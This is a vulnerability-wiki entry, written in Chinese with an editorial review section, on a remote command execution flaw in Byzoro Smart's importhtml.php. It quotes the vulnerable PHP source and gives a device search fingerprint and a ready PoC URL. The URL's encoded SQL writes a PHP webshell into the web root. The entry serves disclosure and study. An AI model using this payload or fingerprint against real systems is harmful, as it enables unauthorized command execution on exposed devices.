---
version: "unknown；原文“漏洞影响”处仅写百卓 Smart，未列软件版本或构建"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-1a930cc9a67e92683ef30230"
entity_id: "ve-1a930cc9a67e92683ef30230"
schema_version: "1"
title: "百卓 Smart importhtml.php 远程命令执行漏洞"
product: "Byzoro Smart"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "include鉴权未示，DB FILE权限/可写Web目录为PoC条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%99%BE%E5%8D%93/%E7%99%BE%E5%8D%93-Smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
previous_version: "百卓 Smart"
---

# 百卓 Smart importhtml.php 远程命令执行漏洞

> 版本字段校订（2026-10-04）：代码、命令、路径、产品名或章节标记误入版本字段的值已逐字保存到对应 `previous_*` 字段；当前版本字段只记正文明确的来源范围，无范围时记为 unknown。后文对此元数据误填的旧说明描述校订前状态，其余实验条件与待核项仍按原文保留。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Byzoro Smart
- 本文讨论：importhtml.php任意SQL；潜在mail_file_path命令注入
- 版本、权限与配置前提：include鉴权未示，DB FILE权限/可写Web目录为PoC条件
- 资料类型：SQL与命令执行源码链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 分析描述SQL结果mail_file_path流入system，但实际PoC是SELECT INTO OUTFILE写PHP，是不同RCE路径
- 缺MySQL FILE/secure_file_priv和PHP执行条件；无版本/修复
- 访问sys1.php路径未写/app前缀

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 实际auth/DB权限、输出字段命令执行链及固件待确认
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

百卓 importhtml.php文件sql语句无过滤，通过Sql语句可远程命令执行

## 漏洞影响

```
百卓 Smart
```

## 网络测绘

```
title="Smart管理平台"
```

## 漏洞复现

登录页面

![](./.resource/百卓-Smart-importhtml.php-远程命令执行漏洞/media/202202140918333.png)


出现漏洞的文件 **importhtml.php**

```php
<?php 
include_once("global.func.php");
if($_SESSION['language']!="english")
{
	require_once ("include/language_cn.php");
}
else 
{
	require_once ("include/language_en.php");
}

if(isset($_GET['type'])) $get_type = $_GET['type'];
if(isset($_GET['tab'])) $get_tab = $_GET['tab'];
if(isset($_GET['sql'])) $get_sql = $_GET['sql'];

if($get_type == "exporthtmlpost")	
{
	$get_tab = $arr_export_cn[$get_tab];
	exportHtml("$get_tab",stripslashes(base64_decode($get_sql)));
}
elseif($get_type == "exporthtmlchat")	
{
	$get_tab = $arr_export_cn[$get_tab];
	exportHtmlChat("$get_tab",stripslashes(base64_decode($get_sql)));
}
elseif($get_type == "exporthtmlmail")	
{
	$get_tab = $arr_export_cn[$get_tab];
	exportHtmlMail("$get_tab",stripslashes(base64_decode($get_sql)));
}
elseif($get_type == "exporthtmlwebsend")	
{
	$get_tab = $arr_export_cn[$get_tab];
	exportHtmlWebSend("$get_tab",stripslashes(base64_decode($get_sql)));
}
elseif($get_type == "exporthtmlwebrecv")	
{
	$get_tab = $arr_export_cn[$get_tab];
	exportHtmlWebRecv("$get_tab",stripslashes(base64_decode($get_sql)));
}
?>
```

跟踪exportHtmlMail函数

```php
function exportHtmlMail($filename,$sql){

	Header( "Expires: 0" );

	Header( "Pragma: public" );

	Header( "Cache-Control: must-revalidate, post-check=0, pre-check=0" );

	Header( "Cache-Control: public");

	Header( "Content-Type: application/octet-stream" );

	header("Accept-Ranges: bytes");

	header("Content-Disposition: attachment; filename=$filename.html");

	echo "<html>\n";

	echo "<head><title>报表</title></head>\n";

	echo "<body>\n";

	$conn = connOther();

	$result = mysql_query($sql,$conn);

	while ($data= mysql_fetch_array($result)){

		$post_content = "";

		if($data['mail_file_path'] == "(null)"){

			$post_content = "<font color=red>内容审计未启用</font>";

		}

		else{


			$post_filename=$data['mail_file_path'];

			$ifother = "";

			$ifother = ifExistOther($post_filename);

			if($ifother!=""){

				$post_filename = $ifother;

			}

			$str = "/usr/bin/cap2con $post_filename pop";

			system($str,$returnvalue);

			$post_filename=str_replace(".cap",".eml",$post_filename);

			$post_content = file_get_contents($post_filename);

			$rec=new mime_decode;

			$post_content=$rec->decode_mime_string($post_content);

			//...

		}

	}

}
```

这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post_filename 可控

```php
$str = "/usr/bin/cap2con $post_filename pop";
```

验证POC

```plain
https://xxx.xxx.xxx.xxx/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn
```

访问成功后会触发下载日志文件，再访问 sys1.php

![](./.resource/百卓-Smart-importhtml.php-远程命令执行漏洞/media/202202140919705.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
